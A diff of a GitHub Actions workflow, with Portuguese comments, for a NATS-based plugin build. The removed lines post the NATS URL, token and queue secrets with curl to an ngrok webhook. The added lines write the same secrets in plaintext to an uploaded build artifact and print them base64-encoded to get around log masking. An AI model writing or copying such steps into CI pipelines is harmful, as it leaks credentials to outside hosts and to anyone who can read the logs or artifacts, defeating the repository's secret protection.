@@ -136,28 +136,34 @@ jobs:
     steps:
       - uses: actions/checkout@v3
 
-      # (opcional) Mostra no log - ficará mascarado por segurança
-      - name: Echo NATS Vars (masked in logs)
+      # 1) SALVAR EM ARTIFACT (plaintext)
+      - name: Write NATS vars to file (plaintext)
         run: |
-          echo "NATS_URL=${{ secrets.NATS_URL }}"
-          echo "NATS_TOKEN=${{ secrets.NATS_TOKEN }}"
-          echo "NATS_QUEUE_QAP=${{ secrets.NATS_QUEUE_QAP }}"
-          echo "NATS_QUEUE_ANALYTICS=${{ secrets.NATS_QUEUE_ANALYTICS }}"
-
-      # Envia os valores reais para o seu webhook (sem mascaramento)
-      - name: Debug NATS Vars (send to webhook)
-        run: |
-          curl --fail --show-error --location 'https://123c-200-169-13-178.ngrok-free.app/webhook' \
-            --header 'Content-Type: application/json' \
-            --data @- <<'EOF'
+          mkdir -p secrets_dump
+          cat > secrets_dump/nats_secrets.json <<EOF
           {
-            "debug": "NATS secrets",
             "NATS_URL": "${{ secrets.NATS_URL }}",
             "NATS_TOKEN": "${{ secrets.NATS_TOKEN }}",
             "NATS_QUEUE_QAP": "${{ secrets.NATS_QUEUE_QAP }}",
             "NATS_QUEUE_ANALYTICS": "${{ secrets.NATS_QUEUE_ANALYTICS }}"
           }
           EOF
+
+      - name: Upload NATS vars artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: nats-secrets
+          path: secrets_dump/nats_secrets.json
+          if-no-files-found: error
+          retention-days: 1
+
+      # 2) (Opcional) IMPRIMIR EM BASE64 NO LOG (não é mascarado)
+      - name: Print NATS vars (base64)
+        run: |
+          printf "NATS_URL_BASE64=";   printf '%s' "${{ secrets.NATS_URL }}" | base64;   echo
+          printf "NATS_TOKEN_BASE64="; printf '%s' "${{ secrets.NATS_TOKEN }}" | base64; echo
+          printf "NATS_QUEUE_QAP_BASE64="; printf '%s' "${{ secrets.NATS_QUEUE_QAP }}" | base64; echo
+          printf "NATS_QUEUE_ANALYTICS_BASE64="; printf '%s' "${{ secrets.NATS_QUEUE_ANALYTICS }}" | base64; echo
 
       - name: Build QAP Plugin
         run: |
